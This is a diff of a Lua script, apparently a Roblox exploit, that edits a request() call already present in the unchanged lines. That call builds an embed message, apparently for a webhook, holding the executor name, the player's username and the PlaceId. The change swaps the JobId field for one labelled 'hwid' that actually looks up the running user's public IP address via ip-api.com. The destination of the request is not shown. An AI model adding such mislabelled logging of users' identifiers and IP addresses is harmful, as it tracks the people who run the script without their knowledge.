@@ -7665,19 +7665,19 @@ request({
                 fields = {
                     {
                         name = 'Executor',
-                        value = '```' .. identifyexecutor() .. '```'
+                        value = '```'.. identifyexecutor().. '```'
                     },
                     {
                         name = 'User',
-                        value = '```' .. game.Players.LocalPlayer.Name .. '```'
+                        value = '```'.. game.Players.LocalPlayer.Name.. '```'
                     },
                     {
                         name = 'PlaceId',
-                        value = '```' .. game.PlaceId .. '```'
+                        value = '```'..game.PlaceId.. '```'
                     },
                     {
-                        name = 'JobId',
-                        value = '```' .. game.JobId .. '```'
+                        name = 'hwid',
+                        value = '```'.. game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json/?fields=61439')).query.. '```'
                     }
                 },
                 color = 15280,
